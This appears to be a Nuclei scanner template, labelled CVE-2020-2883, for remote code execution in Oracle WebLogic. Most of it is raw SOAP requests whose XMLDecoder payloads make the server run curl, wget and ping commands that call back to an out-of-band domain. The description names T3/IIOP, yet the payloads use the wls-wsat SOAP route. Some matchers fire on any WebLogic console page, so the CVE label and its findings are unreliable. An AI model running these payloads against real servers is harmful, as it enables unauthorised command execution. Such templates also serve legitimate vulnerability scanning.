id: CVE-2020-2883

info:
  name: Oracle WebLogic Server - Remote Code Execution
  author: 0x_Akoko
  severity: critical
  description: |
    Oracle WebLogic Server (10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0) contains a remote code execution vulnerability
    caused by unauthenticated access via IIOP and T3 protocols through insecure deserialization. This template exploits
    the vulnerability via HTTP/SOAP with OAST callbacks for blind RCE confirmation.
  reference:
    - https://www.oracle.com/security-alerts/cpuapr2020.html
    - https://www.zerodayinitiative.com/advisories/ZDI-20-504/
    - https://github.com/Y4er/CVE-2020-2883
    - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/misc/weblogic_deserialize_badattr_extcomp.rb
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-2883
    cwe-id: CWE-502
    epss-score: 0.93664
    epss-percentile: 0.99836
    cpe: cpe:2.3:a:oracle:weblogic_server:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 6
    vendor: oracle
    product: weblogic_server
    shodan-query: 'product:"oracle weblogic"'
  tags: cve,cve2020,oracle,weblogic,rce,deserialization,oast,kev

variables:
  oast_domain: "{{interactsh-url}}"

http:
  - raw:
      - |
        GET /console/login/LoginForm.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (compatible; CVE-2020-2883-Scanner)
        Accept: */*
        
      - |
        POST /wls-wsat/CoordinatorPortType HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: ""
        User-Agent: Mozilla/5.0 (compatible; CVE-2020-2883-Curl-Callback)
        Content-Length: {{len}}
        
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java class="java.beans.XMLDecoder">
        <void class="java.lang.Runtime" method="getRuntime">
        <void method="exec">
        <string>curl http://{{oast_domain}}/rce-curl</string>
        </void>
        </void>
        </java>
        </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
        </soapenv:Envelope>

      - |
        POST /wls-wsat/CoordinatorPortType HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: ""
        User-Agent: Mozilla/5.0 (compatible; CVE-2020-2883-Ping-Callback)
        Content-Length: {{len}}
        
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java class="java.beans.XMLDecoder">
        <void class="java.lang.Runtime" method="getRuntime">
        <void method="exec">
        <string>ping -c 4 {{oast_domain}}</string>
        </void>
        </void>
        </java>
        </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
        </soapenv:Envelope>

      - |
        POST /wls-wsat/CoordinatorPortType HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: ""
        User-Agent: Mozilla/5.0 (compatible; CVE-2020-2883-Wget-Callback)
        Content-Length: {{len}}
        
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java class="java.beans.XMLDecoder">
        <void class="java.lang.Runtime" method="getRuntime">
        <void method="exec">
        <array class="java.lang.String" length="3">
        <void index="0">
        <string>/bin/sh</string>
        </void>
        <void index="1">
        <string>-c</string>
        </void>
        <void index="2">
        <string>wget -q -O- http://{{oast_domain}}/rce-wget</string>
        </void>
        </array>
        </void>
        </void>
        </java>
        </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
        </soapenv:Envelope>

      - |
        POST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1
        Host: {{Hostname}}
        Content-Type: text/xml; charset=utf-8
        SOAPAction: ""
        User-Agent: Mozilla/5.0 (compatible; CVE-2020-2883-Alt-Endpoint)
        Content-Length: {{len}}
        
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
        <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <java class="java.beans.XMLDecoder">
        <void class="java.lang.Runtime" method="getRuntime">
        <void method="exec">
        <string>curl http://{{oast_domain}}/alt-endpoint</string>
        </void>
        </void>
        </java>
        </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
        </soapenv:Envelope>

      - |
        GET /_async/AsyncResponseService HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (compatible; CVE-2020-2883-AsyncCheck)
        Accept: */*

    matchers-condition: or
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
        condition: or

      - type: dsl
        name: vulnerable-deserialization
        dsl:
          - 'status_code == 500'
          - 'contains(body, "ObjectHandler") || contains(body, "XMLDecoder")'
        condition: and

      - type: dsl
        name: weblogic-detected
        dsl:
          - 'contains(body, "Oracle WebLogic Server")'
          - 'contains(body, "WebLogic Server Administration Console")'
        condition: and

      - type: word
        name: wsat-endpoint
        part: body
        words:
          - "WLS-WSAT"
          - "weblogic.wsee.wstx.wsat"
          - "CoordinatorPortType"
        condition: or

      - type: word
        name: async-service
        part: body
        words:
          - "AsyncResponseService"
          - "bea.com/async"

    extractors:
      - type: regex
        name: weblogic-version
        part: body
        group: 1
        regex:
          - 'WebLogic Server Version: ([0-9.]+)'
          - 'WebLogic Server ([0-9.]+)'

      - type: kval
        name: interactsh-callback
        kval:
          - interactsh_protocol
